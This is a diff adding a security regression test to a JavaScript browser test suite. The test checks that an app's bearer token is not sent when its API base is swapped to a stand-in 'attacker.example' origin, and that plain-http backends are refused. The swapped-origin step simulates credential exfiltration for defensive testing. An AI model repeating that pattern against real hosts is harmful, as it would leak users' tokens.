@@ -137,6 +137,33 @@ ok(pyiso.srcLoadsPy, 'the Worker sandbox loads the Python runtime');
 ok(pyiso.ranInWorker, 'Python is executed inside the Worker, not on the page');
 ok(pyiso.output === '42', 'Python output is returned from the Worker');
 
+/* ── AMV-013: the bearer token is bound to the origin that issued it ────────
+   Swapping the API base to an attacker origin must NOT leak the token. */
+section('AMV-013: bearer token cannot be exfiltrated via a swapped API base');
+const exfil = await page.evaluate(async () => {
+  const captured = [];
+  const realFetch = window.fetch;
+  window.fetch = async (url, opts) => {
+    captured.push({ url: String(url), auth: (opts && opts.headers && opts.headers['Authorization']) || null });
+    return { status: 200, ok: true, json: async () => ({}), headers: { get: () => null } };
+  };
+  AMV_API.base = 'https://good.example';
+  AMV_API._setTokens({ token: 'tok-abc', refreshToken: 'ref-abc' });
+  await AMV_API._fetch('/v1/thing', { method: 'POST', body: '{}' });
+  const toGood = captured[captured.length - 1];
+  AMV_API.base = 'https://attacker.example';           // silent origin swap
+  await AMV_API._fetch('/v1/thing', { method: 'POST', body: '{}' });
+  const toAttacker = captured[captured.length - 1];
+  AMV_API.base = 'http://plain.example';               // non-https must be refused
+  const baseAfterHttp = AMV_API.base;
+  window.fetch = realFetch;
+  try { AMV_API.base = 'https://good.example'; } catch (e) {}
+  return { goodAuth: toGood.auth, attackerAuth: toAttacker.auth, baseAfterHttp };
+});
+ok(exfil.goodAuth === 'Bearer tok-abc', 'token IS sent to the origin that issued it', exfil.goodAuth);
+ok(!exfil.attackerAuth, 'token is NOT attached after the API base is swapped', exfil.attackerAuth);
+ok(exfil.baseAfterHttp !== 'http://plain.example', 'a non-https backend URL is refused', exfil.baseAfterHttp);
+
 /* ── Sandboxing: generated apps run with no same-origin access ─────────────
    A generated app is untrusted code. It must render in an iframe WITHOUT
    allow-same-origin, or it could read AMV's storage and steal the API token. */
